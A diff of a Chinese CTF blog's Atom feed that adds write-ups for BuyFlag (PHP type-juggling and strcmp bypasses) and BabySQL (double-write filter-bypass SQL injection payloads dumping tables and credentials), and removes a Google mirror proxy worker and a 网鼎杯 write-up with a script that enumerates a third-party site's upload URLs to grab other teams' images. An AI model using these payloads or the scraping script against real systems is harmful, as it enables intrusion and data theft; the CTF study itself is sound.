@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-06-25T14:02:51.670Z</updated>
+  <updated>2020-07-07T13:32:36.235Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -15,6 +15,52 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>极客大挑战2019-BuyFlag</title>
+    <link href="http://lingxin16.github.io/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/"/>
+    <id>http://lingxin16.github.io/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/</id>
+    <published>2020-07-07T12:58:35.000Z</published>
+    <updated>2020-07-07T13:32:36.235Z</updated>
+    
+    <content type="html"><![CDATA[<p>地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/1.png" alt="1"></p><p>随便翻一翻，右边menu菜单有个PayFlag指向pay.php</p><p><img src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/2.png" alt="2"></p><p>这里说我们只能用多少钱买flag并且必须是哪里的学生，并且要回答正确的密码</p><p>查看源代码发现提示</p><pre><code>&lt;!--    ~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) {    $password = $_POST[&#39;password&#39;];    if (is_numeric($password)) {        echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;    }elseif ($password == 404) {        echo &quot;Password Right!&lt;/br&gt;&quot;;    }}--&gt;</code></pre><p>这里的意思是我们需要用post方式提交password，然后password不能是数字，当password等于404的时候返回Password Right!</p><p>emm既需要满足password不是数字，又要满足password等于404</p><p>这里的password类型判断用的is_numeric()</p><p>在PHP手册中了解到</p><pre><code>bool is_numeric( mixed $var)如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。 </code></pre><p>那么如果我们赋值中不仅仅是数字或数字字符串，就是false</p><p>这里我们让password=404%</p><p>在控制台中还能看到一项cookie：user=0</p><p>修改为user=1</p><p><img src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/3.png" alt="3"></p><p>已经提示我们<br>you are Cuiter<br>Password Right!<br>Pay for the flag!!!hacker!!!</p><p>但是Pay for the flag一直没找到在哪里，那就也直接传一个money吧</p><p>但是在这个题中PHP版本是5.3.5，输入字符不能超过八位，否则会提示我们Nember lenth is too long</p><p>关于这个我们可以了解一下strcmp()函数</p><p><img src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/4.png" alt="4"></p><p>这个函数在PHP5.3版本之前有个漏洞，当我们传入非字符串类型的数据的时候，这个函数将发生错误，在PHP5.3版本之前显示了报错的警告信息后会return 0，也就是虽然报了错，但却判定其相等。</p><p>所以我们传money[]=admin</p><p><img src="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/5.png" alt="5"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>极客大挑战2019-BabySQL</title>
+    <link href="http://lingxin16.github.io/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/"/>
+    <id>http://lingxin16.github.io/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/</id>
+    <published>2020-07-06T03:23:56.000Z</published>
+    <updated>2020-07-06T04:21:56.763Z</updated>
+    
+    <content type="html"><![CDATA[<p>​    题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/1.png" alt="1"></p><p>尝试admin登录</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/2.png" alt="2"></p><p>然后尝试利用admin’or 1 = 1#</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/3.png" alt="3"></p><p>显然or被过滤了，</p><p>这里用双写绕过admin’oorr 1 = 1#成功</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/4.png" alt="4"></p><p>username=u’uniunionon selselectect 1,2,3#&amp;password=p</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/5.png" alt="5"></p><p>得到2,3列，接下来爆库得到geek</p><p>u’uniunionon selselectect 1,2,database()#&amp;password=p</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/6.png" alt="6"></p><p>username=u’uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()#&amp;password=p</p><p>得到两个表名’b4bsql,geekuser’</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/7.png" alt="7"></p><p>username=u’uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=’geekuser’#&amp;password=p</p><p>得到三个字段id,username,password</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/8.png" alt="8"></p><p>username=u’uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) frfromom geekuser#&amp;password=p</p><p><img src="/2020/07/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BabySQL/9.png" alt="9"></p><p>没有发现flag</p><p>重复操作在b4bsql表中发现flag</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;​    题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>CentOS配置docker和docker-compose</title>
@@ -422,46 +468,6 @@
       <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
     
       <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>利用cloudflareWorkers制作Google镜像站</title>
-    <link href="http://lingxin16.github.io/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/"/>
-    <id>http://lingxin16.github.io/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/</id>
-    <published>2020-05-11T01:43:04.000Z</published>
-    <updated>2020-05-11T02:53:01.266Z</updated>
-    
-    <content type="html"><![CDATA[<p>今天在群里看到大佬弄的谷歌镜像站，于是也学着部署了一份</p><a id="more"></a><p>首先我们需要注册一个Cloudflare账号</p><p>cloudflare官网： <a href="https://www.cloudflare.com/" target="_blank" rel="noopener">https://www.cloudflare.com/</a></p><p>注册登录之后选择workers</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511094942.jpg" alt="QQ截图20200511094942"></p><p>点击创建worker</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511095051.jpg" alt="QQ截图20200511095051"></p><p>将下边的代码粘贴到左边代码框</p><pre><code>// Website you intended to retrieve for users.const upstream = &#39;www.google.com&#39;// Custom pathname for the upstream website.const upstream_path = &#39;/&#39;// Website you intended to retrieve for users using mobile devices.const upstream_mobile = &#39;www.google.com&#39;// Countries and regions where you wish to suspend your service.const blocked_region = [&#39;KP&#39;, &#39;SY&#39;, &#39;PK&#39;, &#39;CU&#39;]// IP addresses which you wish to block from using your service.const blocked_ip_address = [&#39;0.0.0.0&#39;, &#39;127.0.0.1&#39;]// Whether to use HTTPS protocol for upstream address.const https = true// Whether to disable cache.const disable_cache = true// Replace texts.const replace_dict = {    &#39;$upstream&#39;: &#39;$custom_domain&#39;,    &#39;//google.com&#39;: &#39;&#39;}addEventListener(&#39;fetch&#39;, event =&gt; {    event.respondWith(fetchAndApply(event.request));})async function fetchAndApply(request) {​    const region = request.headers.get(&#39;cf-ipcountry&#39;).toUpperCase();​    const ip_address = request.headers.get(&#39;cf-connecting-ip&#39;);​    const user_agent = request.headers.get(&#39;user-agent&#39;);​    ​    let response = null;​    let url = new URL(request.url);​    let url_hostname = url.hostname;​    ​    if (https == true) {​        url.protocol = &#39;https:&#39;;​    } else {​        url.protocol = &#39;http:&#39;;​    }​    ​    if (await device_status(user_agent)) {​        var upstream_domain = upstream;​    } else {​        var upstream_domain = upstream_mobile;​    }​    ​    url.host = upstream_domain;​    if (url.pathname == &#39;/&#39;) {​        url.pathname = upstream_path;​    } else {​        url.pathname = upstream_path + url.pathname;​    }​    ​    if (blocked_region.includes(region)) {​        response = new Response(&#39;Access denied: WorkersProxy is not available in your region yet.&#39;, {​            status: 403​        });​    } else if (blocked_ip_address.includes(ip_address)) {​        response = new Response(&#39;Access denied: Your IP address is blocked by WorkersProxy.&#39;, {​            status: 403​        });​    } else {​        let method = request.method;​        let request_headers = request.headers;​        let new_request_headers = new Headers(request_headers);​    ​        new_request_headers.set(&#39;Host&#39;, url.hostname);​        new_request_headers.set(&#39;Referer&#39;, url.hostname);​    ​        let original_response = await fetch(url.href, {​            method: method,​            headers: new_request_headers​        })​    ​        let original_response_clone = original_response.clone();​        let original_text = null;​        let response_headers = original_response.headers;​        let new_response_headers = new Headers(response_headers);​        let status = original_response.status;​        ​        if (disable_cache) {​            new_response_headers.set(&#39;Cache-Control&#39;, &#39;no-store&#39;);​        }​    ​        new_response_headers.set(&#39;access-control-allow-origin&#39;, &#39;*&#39;);​        new_response_headers.set(&#39;access-control-allow-credentials&#39;, true);​        new_response_headers.delete(&#39;content-security-policy&#39;);​        new_response_headers.delete(&#39;content-security-policy-report-only&#39;);​        new_response_headers.delete(&#39;clear-site-data&#39;);​        ​        if(new_response_headers.get(&quot;x-pjax-url&quot;)) {​            new_response_headers.set(&quot;x-pjax-url&quot;, response_headers.get(&quot;x-pjax-url&quot;).replace(&quot;//&quot; + upstream_domain, &quot;//&quot; + url_hostname));​        }​        ​        const content_type = new_response_headers.get(&#39;content-type&#39;);​        if (content_type.includes(&#39;text/html&#39;) &amp;&amp; content_type.includes(&#39;UTF-8&#39;)) {​            original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);​        } else {​            original_text = original_response_clone.body​        }​        ​        response = new Response(original_text, {​            status,​            headers: new_response_headers​        })​    }​    return response;}async function replace_response_text(response, upstream_domain, host_name) {    let text = await response.text()​    var i, j;​    for (i in replace_dict) {​        j = replace_dict[i]​        if (i == &#39;$upstream&#39;) {​            i = upstream_domain​        } else if (i == &#39;$custom_domain&#39;) {​            i = host_name​        }​    ​        if (j == &#39;$upstream&#39;) {​            j = upstream_domain​        } else if (j == &#39;$custom_domain&#39;) {​            j = host_name​        }​    ​        let re = new RegExp(i, &#39;g&#39;)​        text = text.replace(re, j);​    }​    return text;}async function device_status(user_agent_info) {    var agents = [&quot;Android&quot;, &quot;iPhone&quot;, &quot;SymbianOS&quot;, &quot;Windows Phone&quot;, &quot;iPad&quot;, &quot;iPod&quot;];    var flag = true;    for (var v = 0; v &lt; agents.length; v++) {        if (user_agent_info.indexOf(agents[v]) &gt; 0) {            flag = false;            break;        }    }    return flag;}</code></pre><p>左上角项目名可以修改</p><p>然后点击保存并部署就可以了 可以先点击右边的预览查看效果</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511095402.jpg" alt="QQ截图20200511095402"></p><p>可以返回首页点击workers来管理</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511095646.jpg" alt="QQ截图20200511095646"></p><p>下面是我创建的镜像</p><p><a href="http://gg.d1a0.workers.dev/" target="_blank" rel="noopener">http://gg.d1a0.workers.dev/</a></p><p>虽然Cloudflare Workers 每天只有10万次免费的请求 ,不过也够个人使用了。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;今天在群里看到大佬弄的谷歌镜像站，于是也学着部署了一份&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>2020网鼎杯青龙组部分wp</title>
-    <link href="http://lingxin16.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/"/>
-    <id>http://lingxin16.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/</id>
-    <published>2020-05-10T13:10:22.000Z</published>
-    <updated>2020-05-11T01:00:06.850Z</updated>
-    
-    <content type="html"><![CDATA[<p>第一次参加网鼎杯，作为一个萌新，这次我们队只做出来了两道题，全程都在解哪个汉信码，最后也没解出来，我太菜了，555…</p><a id="more"></a><h2 id="misc签到"><a href="#misc签到" class="headerlink" title="misc签到"></a>misc签到</h2><p>misc签到题给的是个web容器，打开链接</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510210516.jpg" alt="QQ截图20200510210516"></p><p>根据上方战队名选择战队图片，有三次错误机会，猜的时间是十秒</p><p>当连续猜对15次之后需要输入战队token</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510210711.jpg" alt="QQ截图20200510210711"></p><p>输入token后在控制台找到flag</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510210731.jpg" alt="QQ截图20200510210731"></p><h2 id="crypto-boom"><a href="#crypto-boom" class="headerlink" title="crypto boom"></a>crypto boom</h2><p>下载后是个boom.exe 放在cmd中运行</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510211622.jpg" alt="QQ截图20200510211622"></p><p>根据提示，解一次md5，输入结果</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510211814.jpg" alt="QQ截图20200510211814"></p><p>然后解三元一次方程</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510212119.jpg" alt="QQ截图20200510212119"></p><p>再解出x后得到flag(由于不会解，可以直接爆破得到x)</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510212054.jpg" alt="QQ截图20200510212054"></p><h2 id="crypto-you-raise-me-up"><a href="#crypto-you-raise-me-up" class="headerlink" title="crypto you raise me up"></a>crypto you raise me up</h2><p>下载附件后解压是个py脚本</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomn = 2 ** 512m = random.randint(2, n-1) | 1c = pow(m, bytes_to_long(flag), n)print &#39;m = &#39; + str(m)print &#39;c = &#39; + str(c)# m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075# c = 66658513942032142458567894507236586325208167916217967759097668952330002340</code></pre><p>可以sage工具的discrete_log解</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510215003.jpg" alt="QQ截图20200510215003"></p><p>discrete_log(mod(c,n),mod(m,n))得56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E5%9B%BE%E7%89%8720200511085512.png" alt="QQ图片20200511085512"></p><p>然后用libnum模块解n2s</p><pre><code class="python">import libnumflag = 56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757print (libnum.n2s(flag))</code></pre><p>得到flag</p><h2 id="misc-虚幻二"><a href="#misc-虚幻二" class="headerlink" title="misc 虚幻二"></a>misc 虚幻二</h2><p>今天差不多全程都在解这个题，实在是不知道怎么拼出汉信码</p><p>下载完附件后用Stegsolve分析，保存green，red和blue三个图层</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/green.png" alt="green"></p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/red.png" alt="red"></p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/blue.png" alt="blue"></p><p>看不清可以放大处理一下</p><p>其中red和blue都是31 * 10的排列 green是31 * 11的排列方式，那么从green开始，按照green、blue、red循环的方式，每次用一行进行拼接，得到一个31  * 31的图像  然后需要将左上角7 * 7的方块旋转180°，再将整个图像逆时针旋转90° ，旋转之后图片上方有个7 * 10大小的空白区域，就是hint中所说的暴力恢复的地方</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510214431.jpg" alt="QQ截图20200510214431"></p><p>恢复之后如下图</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510214441.jpg" alt="QQ截图20200510214441"></p><p>在线扫码得到flag</p><p>扫码地址:<a href="http://www.efittech.com/hxdec.html" target="_blank" rel="noopener">http://www.efittech.com/hxdec.html</a></p><p>赛后还听说有的战队是直接爬了解码网站，把其他队伍上传的汉信码都爬了下来…emm</p><p>我研究了下确实是可行的，于是在<a href="https://www.cnblogs.com/anweilx/" target="_blank" rel="noopener">@anweilx</a>师傅的指导下也写了批量爬取的脚本在这里贴出来</p><pre><code class="Python">#coding:utf–8import requestsfor m in range (0,61):#取0分到60分    for s in range (0,61):    #取0秒到60秒        url=&quot;http://www.efittech.com/upload/pics/pic_2020051013&quot; + &quot;%02d%02d&quot;%(m ,s )+&quot;.jpg&quot;        #2020051013是时间格式13是13点        获取=requests.get(url)#获取网络请求信息        #获取网络图片二进制流        流=获取.content        #将二进制流保存到图片文件中        if b&quot;\xff\xd8&quot; in 流:        #判断该图片是否存在            file = open(&quot;./汉信码13/&quot; + &quot;%02d%02d&quot;%(m ,s ) +&quot;.jpg&quot;,&quot;wb&quot;)            #将图片命名为分钟+秒数.jpg            file.write(流)            file.close()</code></pre><p>第一次写，写的不好师傅们轻点打</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E5%9B%BE%E7%89%8720200511085611.jpg" alt="QQ图片20200511085611"></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;第一次参加网鼎杯，作为一个萌新，这次我们队只做出来了两道题，全程都在解哪个汉信码，最后也没解出来，我太菜了，555…&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
     
   </entry>
   
